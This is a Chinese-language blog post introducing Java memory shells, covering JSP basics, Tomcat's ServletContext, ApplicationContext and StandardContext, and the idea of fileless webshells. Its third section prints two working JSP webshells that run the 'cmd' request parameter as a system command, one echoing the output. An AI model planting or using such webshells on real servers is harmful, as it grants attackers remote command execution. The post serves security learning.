# Java内存马 介绍

  
  
&lt;!--more--&gt;  
## 0x01 内存马简史  
servlet-api类  
- filter型  
- servlet型  
spring类  
- 拦截器  
- controller型  
Java Instrumentation类  
- agent型  
## 0x02 JSP基础  
### 什么是JSP  
JSP（Java Server Pages），是Java的一种动态网页请求技术。在早期Java的开发技术中，Java程序员如果想要向浏览器输出一些数据，就必须要手动println一行行的HTML代码。为了解决这一繁琐的问题，Java开发了JSP技术  
JSP可以看作是一个Java Servlet，主要用于实现Java Web应用程序的用户界面部分。网页开发者们通过结合HTML代码、XHTML代码、XML元素以及嵌入JSP操作和命令来编写JSP。  
当第一次访问JSP页面的时，Tomcat服务器会将JSP页面翻译成一个java文件，并将其编译为.class文件。JSP通过网页表单获取用户输入的数据、访问数据库及其它数据源，然后动态地创建网页。  
### JSP环境的搭建  
[Servlet 项目搭建](https://drun1baby.github.io/2022/08/22/Servlet-%E9%A1%B9%E7%9B%AE%E6%90%AD%E5%BB%BA/)  
### JSP的语法  
#### 脚本程序  
脚本程序可以包含任意量的Java语句、变量、方法或表达式，只要他们在脚本语言中是有效的。脚本程序的格式如下  
```java  
&lt;% 代码片段 %&gt;  
```  
下面是使用示例  
```java  
&lt;html&gt;    
&lt;body&gt;    
&lt;h2&gt;Hello World!!!&lt;/h2&gt;    
&lt;% out.println(&#34;GoodBye!&#34;); %&gt;    
&lt;/body&gt;    
&lt;/html&gt;  
```  
同样等价于下面的XML语句  
```xml  
&lt;jsp:declaration&gt;     
代码片段  
&lt;/jsp:declaration&gt;  
```  
#### JSP表达式  
```java  
&lt;%= 表达式 %&gt;  
```  
等价于下面的XML表达式  
```xml  
&lt;jsp:expression&gt;表达式&lt;/jsp:expression&gt;  
```  
下面是使用示例  
```java  
&lt;html&gt;  
&lt;body&gt;  
&lt;h2&gt;Hello World!!!&lt;/h2&gt;  
&lt;p&gt;&lt;% String name = &#34;Huahua&#34;;%&gt;username:&lt;%=name%&gt;&lt;/p&gt;  
&lt;/body&gt;  
&lt;/html&gt;  
```  
#### JSP指令  
JSP指令用来设置与整个JSP页面相关的属性。下面有三种JSP指令  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409131247215.png)
比如我们能通过page指令来设置jsp页面的编码格式  
```java  
&lt;%@ page language=&#34;java&#34; contentType=&#34;text/html; charset=UTF-8&#34; pageEncoding=&#34;UTF-8&#34;%&gt;  
```  
#### JSP注释  
格式如下  
```java  
&lt;%-- 注释内容 --%&gt;  
```  
### JSP内置对象  
JSP有九大内置对象，他们能在客户端与服务端交互的过程中分别完成不同的功能。其特点如下  
由JSP规范提供，不用编写者实例化  
通过Web容器实现和管理  
所有JSP页面均可使用  
只有在脚本元素的表达式或代码段中才能使用  
  
| 对  象                                                       | 类型                                     | 说  明                                                                                            |  
| ---------------------------------------------------------- | -------------------------------------- | ----------------------------------------------------------------------------------------------- |  
| [request](https://drun1baby.top/jsp2/request.html)         | javax.servlet.http.HttpServletRequest  | 获取用户请求信息                                                                                        |  
| [response](https://drun1baby.top/jsp2/response.html)       | javax.servlet.http.HttpServletResponse | 响应客户端请求，并将处理信息返回到客户端                                                                            |  
| [out](https://drun1baby.top/jsp2/out.html)                 | javax.servlet.jsp.JspWriter            | 输出内容到 HTML 中                                                                                    |  
| [session](https://drun1baby.top/jsp2/session.html)         | javax.servlet.http.HttpSession         | 用来保存用户信息                                                                                        |  
| [application](https://drun1baby.top/jsp2/application.html) | javax.servlet.ServletContext           | 所有用户共享信息                                                                                        |  
| [config](https://drun1baby.top/jsp2/config.html)           | javax.servlet.ServletConfig            | 这是一个 Servlet 配置对象，用于 Servlet 和页面的初始化参数                                                          |  
| [pageContext](https://drun1baby.top/jsp2/pagecontext.html) | javax.servlet.jsp.PageContext          | JSP 的页面容器，用于访问 page、request、application 和 session 的属性                                           |  
| [page](https://drun1baby.top/jsp2/page_object.html)        | javax.servlet.jsp.HttpJspPage          | 类似于 Java 类的 this 关键字，表示当前 JSP 页面                                                                |  
| [exception](https://drun1baby.top/jsp2/page.html)          | java.lang.Throwable                    | 该对象用于处理 JSP 文件执行时发生的错误和异常；只有在 JSP 页面的 page 指令中指定 isErrorPage 的取值 true 时，才可以在本页面使用 exception 对象。 |  
## 0x03 传统内存马  
讲完了Tomcat架构的理解和JSP的一些基础，就可以正式学习内存马了  
先看一下传统的JSP内存马  
```java  
&lt;%  
Runtime.getRuntime().exec(request.getParameter(&#34;cmd&#34;));  
%&gt;  
```  
上面的webshell没有回显  
下面是一个带回显的JSP木马  
```java  
&lt;%    
if(request.getParameter(&#34;cmd&#34;)!=null){    
    java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&#34;cmd&#34;)).getInputStream();    
    int a = -1;    
    byte[] b = new byte[2048];    
    out.print(&#34;&lt;pre&gt;&#34;);    
    while((a=in.read(b))!=-1){    
        out.print(new String(b));    
    }    out.print(&#34;&lt;/pre&gt;&#34;);    
}    
    
%&gt;  
```  
传统的JSP木马特征性强，且需要文件落地，容易被查杀。因此现在出现了内存马技术。Java内存马又称&#34;无文件马&#34;，相较于传统的JSP木马，其最大的特点就是无文件落地，存在于内存之中，隐蔽性强。  
- 利用Java Web组件：动态添加恶意组件，如Servlet、Filter、Listener等。在Spring框架下就是Controller、Intercepter。  
- 修改字节码：利用Java的Instrument机制，动态注入Agent，在Java内存中动态修改字节码，在HTTP请求执行路径中的类中添加恶意代码，可以实现根据请求的参数执行任意代码。  
## 0x04 Tomcat中的三个Context的理解  
### Context  
context是上下文的意思，在Java中经常能看到这个东西。  
在WEB请求中也如此，在一次request请求发生时，也就是context会记录当时的情形：当前WEB容器中有几个filter、有什么servlet、有什么listener、请求的参数，请求的路径，有没有什么全局的参数等。  
### ServletContext  
ServletContext是Servlet规范中规定的ServletContext接口，一般servlet都要实现这个接口。  
大概就是规定了如果要实现一个WEB容器，他的Context里面里有这些东西：获取路径，获取参数，获取当前的filter，获取当前的servlet等  
```java  
package javax.servlet;  
   
   
import java.io.InputStream;  
import java.net.MalformedURLException;  
import java.net.URL;  
import java.util.Enumeration;  
import java.util.EventListener;  
import java.util.Map;  
import java.util.Set;  
import javax.servlet.ServletRegistration.Dynamic;  
import javax.servlet.descriptor.JspConfigDescriptor;  
   
   
public interface ServletContext {  
    String TEMPDIR = &#34;javax.servlet.context.tempdir&#34;;  
   
    String getContextPath();  
    ServletContext getContext(String var1);  
    int getMajorVersion();  
    int getMinorVersion();  
    int getEffectiveMajorVersion();  
    int getEffectiveMinorVersion();  
    String getMimeType(String var1);  
    Set getResourcePaths(String var1);  
    URL getResource(String var1) throws MalformedURLException;  
    InputStream getResourceAsStream(String var1);  
    RequestDispatcher getRequestDispatcher(String var1);  
    RequestDispatcher getNamedDispatcher(String var1);  
    /** @deprecated */  
    Servlet getServlet(String var1) throws ServletException;  
    /** @deprecated */  
    Enumeration getServlets();  
    /** @deprecated */  
    Enumeration getServletNames();  
    void log(String var1);  
    /** @deprecated */  
    void log(Exception var1, String var2);  
    void log(String var1, Throwable var2);  
    String getRealPath(String var1);  
    String getServerInfo();  
    String getInitParameter(String var1);  
    Enumeration getInitParameterNames();  
    boolean setInitParameter(String var1, String var2);  
    Object getAttribute(String var1);  
    Enumeration getAttributeNames();  
   
    void setAttribute(String var1, Object var2);  
   
    void removeAttribute(String var1);  
   
    String getServletContextName();  
      
    Dynamic addServlet(String var1, String var2);  
   
    Dynamic addServlet(String var1, Servlet var2);  
   
   
    Dynamic addServlet(String var1, Class var2);  
   
     extends Servlet&gt; T createServlet(Classvar1) throws ServletException;  
   
    ServletRegistration getServletRegistration(String var1);  
   
    Map ? extends ServletRegistration&gt; getServletRegistrations();  
   
    javax.servlet.FilterRegistration.Dynamic addFilter(String var1, String var2);  
   
    javax.servlet.FilterRegistration.Dynamic addFilter(String var1, Filter var2);  
   
    javax.servlet.FilterRegistration.Dynamic addFilter(String var1, Class var2);  
   
     extends Filter&gt; T createFilter(Classvar1) throws ServletException;  
    FilterRegistration getFilterRegistration(String var1);  
    Map ? extends FilterRegistration&gt; getFilterRegistrations();  
    SessionCookieConfig getSessionCookieConfig();  
    void setSessionTrackingModes(Setvar1);  
   
    Set getDefaultSessionTrackingModes();  
   
    Set getEffectiveSessionTrackingModes();  
   
    void addListener(String var1);  
     extends EventListener&gt; void addListener(T var1);  
   
    void addListener(Class var1);  
     extends EventListener&gt; T createListener(Classvar1) throws ServletException;  
    JspConfigDescriptor getJspConfigDescriptor();  
    ClassLoader getClassLoader();  
    void declareRoles(String... var1);  
}  
```  
可以看到ServletContext接口中定义了很多操作，能对Servlet中的各种资源进行访问、添加、删除等。  
### ApplicationContext  
在Tomcat中，ServletContext规范的实现是ApplicationContext，因为门面模式的原因，实际套了一层ApplicationContextFacade。什么是[门面模式](https://www.runoob.com/w3cnote/facade-pattern-3.html)?  
### StandardContext  
`org.apache.catalina.core.StandardContext`是子容器`Context`的标准实现类，其中包含了对Context子容器中资源的各种操作。四种子容器都有其对应的标准实现如下  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409132305055.png)
而在ApplicationContext类中，对资源的各种操作实际上是调用了StandardContext中的方法  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409132305830.png)
```java  
...  
@Override  
    public String getRequestCharacterEncoding() {  
        return context.getRequestCharacterEncoding();  
    }  
...  
```  
### Tomcat三个Context总结  
各Context的关系  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409132306550.png)
ServletContext接口的实现类为ApplicationContext类和ApplicationContextFacade类，其中ApplicationContextFacade是对ApplicationContext类的包装。我们对Context容器中各种资源进行操作时，最终调用的还是StandardContext中的方法，因此StandardContext是Tomcat中负责与底层交互的Context  

---

> Author: N1Rvana  
> URL: http://localhost:1313/java%E5%86%85%E5%AD%98%E9%A9%AC-%E4%BB%8B%E7%BB%8D/  

